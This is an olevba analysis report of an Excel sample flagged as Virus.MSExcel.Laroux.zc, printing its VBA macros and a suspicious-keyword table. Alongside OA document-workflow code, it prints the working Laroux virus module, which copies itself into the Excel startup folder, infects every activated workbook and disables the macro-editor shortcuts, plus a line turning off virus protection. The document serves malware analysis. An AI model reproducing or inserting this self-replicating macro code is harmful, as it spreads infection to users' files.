olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.zc-70e96155c5088e3ddcc080946edb525fe04b347f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Laroux.zc-70e96155c5088e3ddcc080946edb525fe04b347f - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)
  isdocsave = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Laroux.zc-70e96155c5088e3ddcc080946edb525fe04b347f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Laroux.zc-70e96155c5088e3ddcc080946edb525fe04b347f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Laroux.zc-70e96155c5088e3ddcc080946edb525fe04b347f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSExcel.Laroux.zc-70e96155c5088e3ddcc080946edb525fe04b347f - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Declare Function GetPrivateProfileInt Lib "kernel32" Alias "GetPrivateProfileIntA" (ByVal lpApplicationName As String, ByVal lpKeyName As String, ByVal nDefault As Long, ByVal lpFileName As String) As Long
Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Declare Function GetActiveWindow Lib "user32" () As Long

Public Win_Path As String
Public docisreadonly As Boolean
Public isoarun As Boolean
Public isdocsave As Boolean

Sub XgSubject()
  Dim sSubject As String
  
  If Win_Path = "" Then
    Win_Path = GetWin_Path()
  End If
  
  vSelect = Selection
  If (IsArray(vSelect)) Then
     For i = 1 To UBound(vSelect, 1)
        For j = 1 To UBound(vSelect, 2)
           sSubject = sSubject + vSelect(i, j)
        Next j
     Next i
  Else
     sSubject = vSelect
  End If
  
  If Trim(sSubject) <> "" Then
     success = WritePrivateProfileString("Interface", "FieldName", "Subject", Win_Path + "\WebInterface.ini")
     success = WritePrivateProfileString("Interface", "fieldcontent", sSubject, Win_Path + "\WebInterface.ini")
     success = WritePrivateProfileString("Interface", "Action", "SETPARENTFIELD", Win_Path + "\WebInterface.ini")
     success = Shell(Win_Path + "\LtNetComm.exe", vbHide)
  
     MsgBox "系统已成功将所选择的标题引入到登记表的标题栏中！", 0, "提示信息"
  Else
     MsgBox "请选定要登记标题的内容！", 0, "提示信息"
  End If
End Sub

Sub auto_open()
  
    Call publicExcel
    
End Sub

Sub FileSave() '
'按钮保存
  Call PublicSave
End Sub

Sub PublicSave()
' FileSave Macro
' 保存活动文档或模板
' On Error Resume Next
     
  '如果不是从OA中打开文件
  If Not (isoarun) Then
     If Not (ActiveWorkbook.Saved) Then
        ActiveWorkbook.Save
        ActiveWorkbook.Saved = True
     End If
     Exit Sub
  End If
  
  '当文件为只读时（1。从NOTES中标记为只读；2。文件的属性为只读）
  If docisreadonly Or ActiveWorkbook.ReadOnly Then
     If ActiveWorkbook.ReadOnly Then
        MsgBox "当前文档为只读文档！", 0, "提示信息"
     End If
     If Not (ActiveWorkbook.Saved) Then
        ActiveWorkbook.Save
        ActiveWorkbook.Saved = True
     End If
  Else
     ActiveWorkbook.Save
     ActiveWorkbook.Saved = True
     '上传
     Call UploadFile(False)
     isdocsave = True
  End If
End Sub

Sub Auto_Close()
'
' AutoClose Macro

  Call PublicExit

End Sub

Sub FileClose()
   'Call PublicExit
   If Application.Workbooks.Count > 1 Then
      ActiveWorkbook.Close
   Else
      Application.Quit
   End If
End Sub

Function PublicExit()
'退出时调用
'其主要功能是确定当前文档是否需要保存，
'弹出对话框提示保存

  On Error Resume Next
    
  '如果不是从OA中启动时退出处理
  If Not (isoarun) Then
     'ActiveWorkbook.Close
     Exit Function
  End If
    
 '当文件为只读时（1。从OA中标记为只读；2。文件的属性为只读）
  If docisreadonly Or ActiveWorkbook.ReadOnly Then
     Exit Function
  End If
  
  If Not (ActiveWorkbook.Saved) Then
    answer = MsgBox("是否保存当前文档？", 3, "提示信息")
    Select Case answer
    Case 2
       Exit Function
    Case 6
       Call ActiveWorkbook.Save
       If Not (UploadFile(True)) Then
          ActiveWorkbook.Saved = False
          Exit Function
       End If
    Case 7
       If Not isdocsave Then
          If Not (UploadFile(True)) Then
             ActiveWorkbook.Saved = False
             Exit Function
          End If
       End If
    End Select
  ElseIf Not isdocsave Then
      If Not (UploadFile(True)) Then
          ActiveWorkbook.Saved = False
          Exit Function
      End If
  End If
  ActiveWorkbook.Saved = True
  
  Set myBar = CommandBars("审批功能箱")
  If Not myBar Is Nothing Then
     myBar.Delete
  End If
  
  isoarun = False
  If Win_Path = "" Then
     Win_Path = GetWin_Path()
  End If
  Call WritePrivateProfileString("Word", "WebWindowHwnd", CStr(hwnd), Win_Path + "\WebInterface.ini")
  If Application.Workbooks.Count > 1 Then
     ActiveWorkbook.Close
  Else
     Application.Quit
  End If
End Function

Function UploadFile(isCheckSuccess As Boolean) As Boolean
'--------------------------------------------------------------------
'将文件上传至服务器
'isCheckSuccess: true -- 检查是否上传成功,false -- 不检查直接返回
'--------------------------------------------------------------------
  Dim sReturn As String

  UploadFile = False
  '系统路径
  If Win_Path = "" Then
     Win_Path = GetWin_Path()
  End If
  '恢复备份值,使上传能正确写入数据库中
  'Call ResetInivalues
  success = WritePrivateProfileString("Interface", "Action", "Upload", Win_Path + "\WebInterface.ini")
  success = WritePrivateProfileString("Interface", "IsUnlock", "y", Win_Path + "\WebInterface.ini")
  success = Shell(Win_Path + "\LtNetComm.exe", vbHide)
  
  If isCheckSuccess Then
     Call WritePrivateProfileString("Interface", "WebErromsg", "", Win_Path + "\WebInterface.ini")
     For i = 1 To 20
        sReturn = GetIniVar(Win_Path + "\WebInterface.ini", "Interface", "WebErromsg")
        If sReturn = "文件上传成功" Then
           UploadFile = True
           Exit For
        ElseIf sReturn <> "" Then
           Exit For  '退出
        Else  '延时10次,每次半秒
           Call Sleep(500)
        End If
     Next i
 Else
    UploadFile = True
 End If
End Function
Public Sub publicExcel()

    On Error Resume Next
    
    Dim myBar As CommandBar
    Dim mybarbut1 As CommandBarButton
    Dim mybarbut2 As CommandBarButton
    Dim mybarbut3 As CommandBarButton
    Dim mybarbut4 As CommandBarButton
    Dim username As String
    
  
    '查找以前的工具条，如果有将其删除
    Set myBar = CommandBars("审批功能箱")
    If Not myBar Is Nothing Then
        myBar.Delete
    End If
    
    '检测当前系统的环境变量Excelopen 变量，判断是否是从OA中启动
    '当其值为1时，表示是从OA中启动，
    Win_Path = GetWin_Path()
    
    Excelopen = GetPrivateProfileInt("excel", "excelOpen", 0, Win_Path + "\WebInterface.ini")
    If Excelopen = 0 Then
        isoarun = False
        Exit Sub
    End If
    '将EXCELOPEN置为0
    success = WritePrivateProfileString("excel", "excelOpen", "0", Win_Path + "\WebInterface.ini")
    '标记在OA中运行
    isoarun = True
    isdocsave = True
    
    '关闭病毒检测
    Options.VirusProtection = False
    
    '----------------------------------------------------------------------
    '下载本文档的值
    '----------------------------------------------------------------------
    Dim fieldName As String
    fieldName = "ISQSZFILE"
    Call WritePrivateProfileString("Interface", "FieldName", fieldName, Win_Path + "\WebInterface.ini")
    '动作为取父文档域值
    Call WritePrivateProfileString("Interface", "Action", "GETFIELD", Win_Path + "\WebInterface.ini")
    success = Shell(Win_Path + "\LtNetComm.exe", vbHide)
     
    
    '新建立一个工具条
    If CommandBars.item("审批功能箱") = Null Then
        Set myBar = CommandBars.Add(Name:="审批功能箱", Position:=msoBarTop, Temporary:=True)
    Else
        Set myBar = CommandBars("审批功能箱")
    End If
    
    CommandBars("审批功能箱").Visible = True
    With myBar
       If myBar.Controls.Count = 0 Then
          Set mybarbut1 = myBar.Controls.Add(Type:=msoControlButton)
          Set mybarbut2 = myBar.Controls.Add(Type:=msoControlButton)
          Set mybarbut3 = myBar.Controls.Add(Type:=msoControlButton)
          Set mybarbut4 = myBar.Controls.Add(Type:=msoControlButton)
          Set mybarbut5 = myBar.Controls.Add(Type:=msoControlButton)
          mybarbut1.Style = msoButtonIconAndCaption
          mybarbut1.Caption = "返回"
          mybarbut1.TooltipText = "退出到OA中"
          mybarbut1.FaceId = 41
          mybarbut1.OnAction = "fileclose"
          mybarbut1.BeginGroup = True
          mybarbut2.Style = msoButtonIconAndCaption
          mybarbut2.Caption = "保存"
          mybarbut2.TooltipText = "将当前文件保存到OA中"
          mybarbut2.FaceId = 3
          mybarbut2.OnAction = "filesave"
          mybarbut2.BeginGroup = True
          mybarbut3.Style = msoButtonIconAndCaption
          mybarbut3.Caption = "登记标题"
          mybarbut3.TooltipText = "更改属性文件夹的标题"
          mybarbut3.FaceId = 31
          mybarbut3.OnAction = "XgSubject"
          mybarbut3.BeginGroup = True
          mybarbut4.Style = msoButtonIconAndCaption
          mybarbut4.Caption = "插入文件"
          mybarbut4.TooltipText = "在当前光标处插入文件"
          mybarbut4.FaceId = 271
          mybarbut4.OnAction = "File_yr"
          mybarbut4.BeginGroup = True
          mybarbut5.Style = msoButtonIconAndCaption
          mybarbut5.Caption = "打印"
          mybarbut5.TooltipText = "打印当前文档"
          mybarbut5.FaceId = 2521
          mybarbut5.OnAction = "FilePrint"
          mybarbut5.BeginGroup = True
       End If
    End With
   
    '判断是否只读属性
    docnotsave = GetIniVar(Win_Path + "\WebInterface.ini", "Interface", "IsReadOnly")
    If docnotsave = "Y" Then
        docisreadonly = True
        MsgBox "当前文件为只读文件，您现在对文件所做的任何修改都不予保存！", 0, "提示信息"
    End If
    
    If docisreadonly Or ActiveWorkbook.ReadOnly Then
        myBar.Controls(2).Visible = False
        myBar.Controls(3).Visible = False
    End If
    
    If GetIniVar(Win_Path + "\WebInterface.ini", "GetField", "ISQSZFILE") <> "缺省" Then
        myBar.Controls(3).Visible = False
    End If
    
    '将word窗口句柄写入ini '2003-06-17 syh用GetActiveWindow取句柄
    hwnd = GetActiveWindow()
    If hwnd <> 0 Then
        Call WritePrivateProfileString("Word", "WebWindowHwnd", CStr(hwnd), Win_Path + "\WebInterface.ini")
    End If
   ActiveWorkbook.Saved = True
End Sub

Function GetWin_Path() As String
 '取Win目录的路径
    Dim a As Integer
    Dim b As String * 40
    Dim c As Long
    
    c = Len(b)
    a = GetWindowsDirectory(b, c)
    GetWin_Path = Left(b, a)
End Function

Public Sub File_yr()
'
'宏的功能是引入文件
  Dim CurrentFilename As String
  Dim ChaRuFilename As String
  Dim SaveFilename As String
  
  On Error Resume Next
  Application.Dialogs(xlDialogOpen).Show
  Sheets.Move before:=Workbooks(1).Sheets(1)
End Sub

Sub FilePrint()
'
' 打印当前文件

On Error Resume Next

    Application.Dialogs(xlDialogPrint).Show
    
End Sub

Function GetIniVar(inifilename As String, mainkey As String, varname As String) As String
  Dim Str1 As String * 255
  Dim Len1 As Integer
  Dim tmpstring As String
   
  getstrfromini = ""
  Len1 = Len(Str1)
  Len1 = GetPrivateProfileString(mainkey, varname, "", Str1, Len1, inifilename)
  tmpstring = Str1
  getstrfromini = Trim(Left(tmpstring, InStr(1, tmpstring, Chr(0)) - 1))
  GetIniVar = getstrfromini
End Function
-------------------------------------------------------------------------------
VBA MACRO StartUp.bas 
in file: Virus.MSExcel.Laroux.zc-70e96155c5088e3ddcc080946edb525fe04b347f - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
  On Error Resume Next
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").del
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("StartUp.xls").Save
    Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "StartUp.xls!acop"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub

Sub acop()
Attribute acop.VB_ProcData.VB_Invoke_Func = " \n14"
  On Error Resume Next
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub

Sub aback()
Attribute aback.VB_ProcData.VB_Invoke_Func = " \n14"
  On Error Resume Next
  Application.OnKey "%{F8}", "StartUp.xls!escape"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnSheetActivate = "StartUp.xls!acop"
  Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!acop"
  Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartU
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |LtNetComm.exe       |Executable file name                         |
+----------+--------------------+---------------------------------------------+

